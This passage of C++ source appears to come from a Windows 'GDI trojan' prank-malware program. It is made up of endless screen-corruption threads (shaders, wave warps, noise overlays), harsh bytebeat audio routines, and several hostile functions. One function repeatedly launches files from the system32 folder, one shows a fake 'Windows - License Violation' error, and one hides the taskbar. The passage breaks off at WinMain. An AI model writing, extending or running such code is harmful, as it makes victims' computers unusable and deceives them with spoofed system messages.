	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * cbrt(y / 30));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				hslcolor.s = 0.700f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI invcc(LPVOID lpParam) { //credits to N17Pro3426
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), size = 100, radius = 227;
	//SeedXorshift32(__rdtsc());
	while (1) {
		hdc = GetDC(0);
		int origX1 = rand() % sw, origY1 = rand() % sh;
		int origX2 = -20 + rand() % (sw + 20), origY2 = -20 + rand() % (sh + 20);
		int origX3 = -30 + rand() % (sw + 30), origY3 = -30 + rand() % (sh + 30);
		int origX4 = -20 + rand() % (sw + 20), origY4 = -20 + rand() % (sh + 20);
		int origX5 = rand() % sw, origY5 = rand() % sh;
		for (int angle = 0; angle < 1081; angle += 12.1) {
			//InvalidateRect(0, 0, 0);
			int x1 = radius * cos(angle * M_PI / 180.0) + origX1, y1 = radius * sin(angle * M_PI / 180.0) + origY1;
			if (angle < 720) size += 20; if (angle > 720) size -= 39;
			HRGN circle1 = CreateEllipticRgn(x1, y1, x1 - size, y1 - size);
			InvertRgn(hdc, circle1);
			Sleep(26.4);
		}
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI wave2(LPVOID lpParam) {
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1) {
		HDC hdc = GetDC(0);
		for (int i = 0; i < sh*2; i++) {
		    int wave = tan(i / ((float)xSize) * M_PI) * (ySize);
		    BitBlt(hdc, i, 0, 1, sh, hdc, i, wave, SRCCOPY);
		}
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader12(LPVOID lpvd) //credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * cbrt(x ^ y * i));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				hslcolor.s = 0.700f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI wave3(LPVOID lpParam) {
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1) {
		HDC hdc = GetDC(0);
		for (int i = 0; i < sh*2; i++) {
		    int wave = tan(i / ((float)xSize) * M_PI) * (ySize);
		    BitBlt(hdc, i, 0, 1, sh, hdc, i, wave, SRCCOPY);
		}
		for (int i = 0; i < sw * 2; i++) {
			int wave = tan(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdc, 0, i, sw, 1, hdc, wave, i, SRCCOPY);
		}
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader13(LPVOID lpvd) //credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(x ^ i));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				hslcolor.s = 0.700f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader14(LPVOID lpvd) //credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(x ^ i));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCERASE);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI stretch(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);


	while (1) {
		hdc = GetDC(NULL);
		StretchBlt(hdc, 0, 20, w, h - 20, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}
DWORD WINAPI shader15(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			if (i % h == 0 && rand() % 110)
				v = rand() % 50;
			((BYTE*)(data + i))[v + v] = x ^ y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI wave4(LPVOID lpParam) {
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1) {
		HDC hdc = GetDC(0);
		for (int i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdc, i, 0, 1, sh, hdc, i, wave, SRCCOPY);
		}
		for (int i = 0; i < sw * 2; i++) {
			int wave = tan(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdc, 0, i, sw, 1, hdc, wave, i, SRCCOPY);
		}
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI opener(LPVOID lpvd)
{
	HANDLE hFindFile;
	BOOL BVar1;
	int auStack612[4];
	_WIN32_FIND_DATAW local_260;

	do {
		do {
			hFindFile = FindFirstFileW(L"C:\\WINDOWS\\system32\\*.*", &local_260); //open random system32 files, like monoxide
			ShellExecuteW((HWND)0x0, L"open", local_260.cFileName, (LPCWSTR)0x0, (LPCWSTR)0x0, 5);
			BVar1 = FindNextFileW(hFindFile, &local_260);
		} while (BVar1 == 0);
		do {
			ShellExecuteW((HWND)0x0, L"open", local_260.cFileName, (LPCWSTR)0x0, (LPCWSTR)0x0, 5);
			Sleep(0xfa);
			BVar1 = FindNextFileW(hFindFile, &local_260);
		} while (BVar1 != 0);
	} while (true);
}
DWORD WINAPI shader16(LPVOID lpParam) { //credits to N17Pro3426 for the radius
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int rgb = MAXDWORD64, v = 0, radius = 17.4f; double angle = 0;
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 6) {
		//if (!i) for (int c = 0; c < 21; c++)InvalidateRect(0, 0, 0);
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			if (i % h == 0 && rand() % 100 == 0)  v = 1 + rand() % 6;
			rgb = (int)data + (x * y);
			((BYTE*)(data + i))[v] = rgb;
		}
		float x = cos(angle) * radius, y = sin(angle) * radius;
		SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
		//Sleep(39.7);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}
DWORD WINAPI shader17(LPVOID lpParam) { //credits to N17Pro3426 for the radius
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int rgb = MAXDWORD64, v = 0, radius = 17.4f; double angle = 0;
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 6) {
		//if (!i) for (int c = 0; c < 21; c++)InvalidateRect(0, 0, 0);
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			if (i % h == 0 && rand() % 100 == 0)  v = 1 + rand() % 6;
			rgb = (int)data + (rand());
			((BYTE*)(data + i))[v] = rgb;
		}
		float x = cos(angle) * radius, y = sin(angle) * radius;
		SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
		//Sleep(39.7);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}
DWORD WINAPI shader18(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			//INT x = i % w, y = i / w;
			rgbScreen[i].r = rand();
			rgbScreen[i].g = rand();
			rgbScreen[i].b = rand();
			//rgbScreen[i].rgb += x * y ^ i;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t >> 2) * t >> 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t >> 62) * t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 5 * (t >> 2) * (t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (0xCA98CA98 >> (t >> 9 & 30) & 15) * t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (0xCA98CA98 >> (t >> 9 & 30) & 15) * t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() { //credits to fr4ctalz
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (t>>6 !=0) buffer[t] = static_cast<char>(t >> 4 * t % (t >> 6) + t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() { //credits to fr4ctalz
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (-t != 0) buffer[t] = static_cast<char>(t >> 4 * t & (t >> 6) + t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 8) * 231);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 5) * (t >> 7) | t >> 25);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 6) | (t >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) * (4 + (1 & t >> 8)) >> (3 & t >> 9) | t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(10 * (t >> 8 | t * t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (47 & t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (5 & t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4000, 4000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[4000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (54 & t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound16() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4000, 4000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[4000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (54 & t >> 3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4000, 4000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[4000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (54 & t >> 3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI fakeerror(LPVOID lpParam) {
	MessageBox(NULL, L"The system has detected tampering with your registered product type. This is a violation of your software license. Tampering with your product type is not permitted.", L"Windows - License Violation", MB_ICONERROR);
	return 0;
}
DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
